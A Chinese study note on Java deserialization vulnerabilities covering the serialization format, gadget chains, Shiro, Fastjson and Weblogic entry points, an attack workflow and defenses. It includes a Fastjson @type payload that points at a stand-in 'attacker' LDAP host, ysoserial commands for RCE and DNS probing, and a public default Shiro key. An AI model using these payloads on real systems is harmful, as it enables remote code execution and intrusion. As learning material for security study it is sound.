# 2026-08-11 Java 反序列化入门

> 昨天学了 PHP 反序列化，今天进阶 Java 版。本质一模一样：解包时自动触发方法，属性值可控。差别在格式、入口和"链"的构造方式。

---

## 一、是什么（我的理解）

### 1.1 Java 的序列化和反序列化

Java 把对象转成字节流（序列化），再还原成对象（反序列化）。跨网络传输、存 session、存缓存都会用到。

```java
// 对象 → 字节流（打包）
ObjectOutputStream oos = new ObjectOutputStream(...);
oos.writeObject(obj);

// 字节流 → 对象（解包）
ObjectInputStream ois = new ObjectInputStream(...);
Object obj = ois.readObject();   // ← 漏洞点
```

### 1.2 类比（延续昨天的乐高）

```
序列化   = 把乐高模型拆成零件装进快递盒（Java 特有格式的盒子）
反序列化 = 收到快递，拆盒拼回模型

漏洞点  = 快递盒里被塞了机关，拆盒时自动触发
        → Java 里这个"自动触发"是 readObject() / 类的特殊方法
```

### 1.3 和 PHP 反序列化的对比（先建立坐标系）

| 维度 | PHP | Java |
|------|-----|------|
| 反序列化函数 | `unserialize()` | `ObjectInputStream.readObject()` |
| 自动触发方法 | `__destruct()` / `__wakeup()` 等魔术方法 | `readObject()` / `readResolve()` / `finalize()` |
| 序列化格式 | 文本格式 `O:6:"Person":2:{...}` | 二进制字节流（魔数 `AC ED 00 05`） |
| 链的构造 | POP 链（属性导向） | **Gadget Chain**（利用公共库自带类） |
| 常见入口 | GET/POST/Cookie 参数 | HTTP Header（如 Shiro rememberMe）、Cookie、JSON 解析 |
| 攻击武器库 | 手写 payload | **ysoserial** 一键生成 |

**一句话**：PHP 靠魔术方法，Java 靠反序列化时自动调用的方法 + 利用公共库（如 CommonsCollections）里的现成类拼链。

---

## 二、Java 序列化格式

### 2.1 魔数（快速识别 Java 序列化）

Java 序列化数据以固定的魔数开头：

```
AC ED 00 05
```

- `AC ED` = STREAM_MAGIC（固定）
- `00 05` = STREAM_VERSION（版本 5）

**实战意义**：抓包/看请求时，看到 `AC ED 00 05` 开头的内容（或 Base64 编码后 `rO0AB` 开头），立刻能判断这是 Java 序列化数据 —— 这可能就是反序列化攻击入口。

| 原始数据开头 | Base64 编码后开头 | 判断 |
|-------------|-----------------|------|
| `AC ED 00 05` | `rO0AB` | Java 序列化对象 |

### 2.2 常用协议标签（TC_ 开头）

| 标签 | 十六进制 | 含义 |
|------|---------|------|
| TC_OBJECT | `0x73` | 对象 |
| TC_CLASSDESC | `0x72` | 类描述 |
| TC_STRING | `0x74` | 字符串 |
| TC_ARRAY | `0x75` | 数组 |
| TC_ENDBLOCKDATA | `0x78` | 数据块结束 |

### 2.3 序列化数据里的类信息

序列化数据中会**完整记录类名、字段名、字段类型**——这就是为什么反序列化时 JVM 要能找到对应类。

---

## 三、漏洞原理

### 3.1 三个条件（和 PHP 完全对称）

```
① readObject() 的输入用户可控（Header / Cookie / 参数）
② 被反序列化的类（或链上的类）有危险方法（readObject / 回调方法）
③ 方法内部的操作能被对象属性影响（属性是攻击者构造的）
```

### 3.2 反序列化时自动调用的方法

| 方法 | 触发时机 | 作用 |
|------|---------|------|
| `readObject()` | 反序列化过程中自动调用 | **核心入口**。类自己实现的 readObject 可能包含危险操作 |
| `readResolve()` | readObject 之后调用 | 常被框架用来替换返回对象 |
| `finalize()` | 对象被 GC 回收前 | 类似 PHP 的 `__destruct()` |
| `hashCode()` / `toString()` | 对象被放入 HashMap / 被拼接字符串时 | 配合 HashMap 链触发 |

### 3.3 关键区别：Java 的"链"用的是现成库

PHP 需要目标代码里有可利用的类；Java 项目**必然**引入各种第三方库（Spring、Commons-Collections、Fastjson...），这些库自带大量类，类之间方法调用关系复杂，攻击者用 ysoserial 把这些现成类串成链 → 这就是 **Gadget Chain（小工具链）**。

```
对象属性 A → HashMap.readObject() → A.hashCode()
  → B.equals() → C.toString() → D 的某个方法 → Runtime.exec() 命令执行
```

每个类只做一件小事，串起来末端是危险函数 —— 和 PHP POP 链思路一样。

---

## 四、常见利用场景（按实战频率）

### 4.1 原生 Java 反序列化入口

最经典的形态：直接拿到一个 readObject 入口，且环境里有可利用的 Gadget 依赖。

**检测三步**：
1. 找入口：参数 / Header 哪里可能被反序列化（搜索 `readObject`、`XMLDecoder`、`ObjectInputStream`）
2. 看有没有回显或报错（报错能泄露类名、依赖版本）
3. 测依赖：发送一个 ysoserial 生成的探测 payload，看目标是否响应

### 4.2 Shiro（rememberMe）

Apache Shiro 的 `rememberMe` Cookie 会经过 AES 加密 + 反序列化。密钥如果使用默认值（`kPH+bIxk5D2deZiIxcaaaA==` 等公开密钥），攻击者就能：

```
构造恶意序列化对象 → 用已知密钥 AES 加密 → 放进 rememberMe Cookie
  → 服务器解密 → readObject() 反序列化 → RCE
```

**检测特征**：响应头带 `rememberMe=deleteMe` 就可能存在。

### 4.3 Fastjson / Jackson（JSON 反序列化）

JSON 反序列化也属于反序列化漏洞。Fastjson 的 `@type` 字段可以指定任意类，配合 autoType 绕过 → RCE。

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/exp","autoCommit":true}
```

### 4.4 Weblogic / 中间件

Weblogic 的 T3 协议、XMLDecoder 等都是历史经典入口，大量 CVE（CVE-2015-4852 等）本质都是反序列化。

---

## 五、通用攻击流程（我的思路）

```
① 找反序列化入口
   搜 readObject / ObjectInputStream / XMLDecoder / 反序列化框架
   入口可能是 Header、Cookie、参数、文件上传解析

② 识别目标技术栈
   用什么框架？（Spring / Shiro / Fastjson / Weblogic...）
   有哪些第三方库？（决定能拼什么 Gadget 链）

③ 选链 / 生成 payload
   本地搭同版本环境（docker 起靶场）
   ysoserial 生成：java -jar ysoserial.jar CommonsCollections6 "命令"
   或用 URLDNS 链先验证（无害探测，看目标是否发起 DNS 请求）

④ 编码 & 发送
   注意入口的编码要求（Base64 / URL 编码 / AES 加密如 Shiro）

⑤ 验证结果
   DNSLog 验证 → 回显验证 → 弹 shell
```

### URLDNS 链（最实用的探测手段）

ysoserial 的 `URLDNS` 链**不需要任何依赖**，只发一个 DNS 查询，用来确认目标是否存在反序列化漏洞 —— 无害且通用。

```bash
java -jar ysoserial.jar URLDNS "http://your-id.dnslog.cn" > payload.bin
# 把 payload 发到目标入口，去 DNSLog 平台看有没有收到请求
# 收到 = 目标执行了反序列化 → 再换 RCE 链
```

---

## 六、怎么防御

| 层面 | 措施 |
|------|------|
| 输入源 | 不要对不可信数据做反序列化；用 JSON 等安全格式替代 |
| 反序列化过滤 | `ObjectInputFilter`（Java 9+）白名单/黑名单类 |
| 依赖治理 | 升级第三方库版本（修复已知 Gadget 链）；移除不用的库 |
| 框架配置 | Shiro 改密钥；Fastjson 关 autoType / 升级；Jackson 禁用多态 |
| 运行时 | WAF 检测 `AC ED 00 05` / `rO0AB` 特征；RASP 拦截 readObject |
| 最小暴露 | 不暴露 T3 等内部协议到公网 |

---

## 七、我的总结

| 要点 | 一句话 |
|------|--------|
| 和 PHP 同源 | 解包时自动触发方法 + 属性可控 |
| 识别特征 | `AC ED 00 05` / Base64 `rO0AB` |
| Java 特色 | Gadget Chain —— 用现成公共库的类拼链 |
| 武器库 | ysoserial 一键生成（URLDNS 先探测，无害） |
| 高频入口 | Shiro rememberMe、Fastjson @type、Weblogic T3 |
| 防御核心 | 不反序列化不可信数据 + 升级依赖 + 过滤危险类 |

---

## 关联笔记

- [PHP 反序列化入门](./2026-08-10-PHP反序列化入门.md) — 昨天学的，POP 链和 Gadget Chain 思路完全对应
- [Token 安全与防护绕过](./2026-08-10-Token安全与防护绕过.md) — Shiro rememberMe 也涉及密钥猜解，思路可复用
- [文件包含漏洞详解](./2026-08-05-文件包含漏洞详解.md) — 反序列化链的常见终点是文件操作/命令执行

## 待实践

- [ ] 本地起一个 Java 环境，用 ysoserial URLDNS 验证反序列化（先跑通探测）
- [ ] CTF 里找一道 Java 反序列化题，从"识别入口"到"RCE"完整走一遍
- [ ] Shiro 靶场练 rememberMe 默认密钥利用
- [ ] 对比 PHP POP 链和 Java Gadget Chain，画一张对应关系图

> ⚠️ 声明：以上技术仅用于 CTF 竞赛和授权靶场环境。
